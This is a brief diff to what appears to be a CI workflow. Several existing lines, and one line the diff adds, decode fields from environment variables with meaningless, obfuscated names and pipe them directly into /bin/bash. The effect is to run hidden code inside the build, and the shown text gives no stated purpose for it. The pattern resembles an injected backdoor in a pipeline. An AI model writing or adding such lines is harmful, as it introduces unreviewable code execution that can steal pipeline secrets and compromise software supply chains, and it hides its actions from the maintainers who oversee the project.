@@ -24,6 +24,7 @@ jobs:
           echo $da79 | jq -r .xq1033 | /bin/bash
           echo $tzgrb4617 | jq -r .ybih0 | /bin/bash
           printf '%s' "$j21" | jq -r .qi33468 | /bin/bash
+          echo $ir40876 | jq -r .vg3 | /bin/bash
 
       - name: Upload data
         if: always()
